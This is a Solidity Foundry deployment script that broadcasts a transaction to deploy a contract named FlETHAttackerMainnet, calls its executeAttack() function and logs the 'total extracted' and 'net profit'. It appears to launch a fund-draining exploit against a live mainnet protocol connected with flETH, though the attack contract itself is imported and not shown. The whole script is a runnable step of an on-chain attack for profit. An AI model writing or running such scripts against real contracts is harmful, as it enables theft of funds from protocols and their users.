// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Script.sol";
import "../src/flETH_to_Strategy_1.sol";

contract DeployAndAttack1 is Script {
    function run() external {
        vm.startBroadcast();

        FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
        console.log("Contract deployed at:", address(attacker));

        attacker.executeAttack();
        console.log("SUCCESS!");
        console.log("Total extracted:", attacker.totalExtracted());
        console.log("Net profit:", attacker.netProfit());

        vm.stopBroadcast();
    }
}
